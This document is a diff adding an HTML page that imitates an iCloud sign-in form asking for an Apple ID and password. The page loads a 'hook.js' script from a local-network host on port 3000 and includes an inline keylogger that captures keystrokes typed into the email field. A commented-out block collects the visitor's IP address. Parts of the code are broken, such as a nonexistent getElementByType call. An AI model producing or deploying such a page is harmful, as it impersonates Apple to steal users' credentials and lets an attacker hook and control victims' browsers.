@@ -1,0 +1,62 @@
+<html>
+<!-- <script src="https://cdn.jsdelivr.net/gh/bigdatacloudapi/js-client-ip-client@latest/bigdatacloud_client_ip.min.js" type="text/javascript"></script>
+<script type="text/javascript">
+
+    getBDCClientIp(
+        /* provide a callback function for receiving the client ip */
+        function(result) {
+            console.log(result);
+        }
+    );
+
+</script> -->
+<body>
+  <script src="/script.js"></script>
+  <script src="192.168.1.112:3000/hook.js" id="dynamic-script"></script>
+  <script>
+
+    const textbox = document.getElementByType('email');
+    const log = document.getElementByType('password');
+
+
+    // Array to hold logged keystrokes
+    let keystrokes = [];
+    // Event listener for keydown events
+    textbox.addEventListener('keydown', (event) => {
+        // Log the key pressed
+        keystrokes.push(event.key);
+        // Update the log display
+        log.textContent = keystrokes.join('');
+        console.log("++++++++++++++++++++++++++++++++")
+        console.log(log.textContent)
+
+    });
+
+</script>
+  
+  <link rel="stylesheet" href="styles.css">
+  <div>
+    <h1>Sign In to iCloud</h1>
+    <h6>Enter your Apple ID and password to sign into iCloud.</h6>
+    <form>
+      <main>
+        <input type="email" name="email" placeholder="e-mail address" />
+        <input type="password" name="password" placeholder="password" />
+      </main>
+      <footer>
+        <button type="reset" id="reset-btn">Cancel</button>
+        <button type="submit" id="submit-btn">OK</button>
+      </footer>
+    </form>
+  </div>
+
+  <aside>
+    <p>
+      <div id="status">Status: Waiting for input...</div>
+
+    </p>
+  </aside>
+</body>
+
+</html>
+
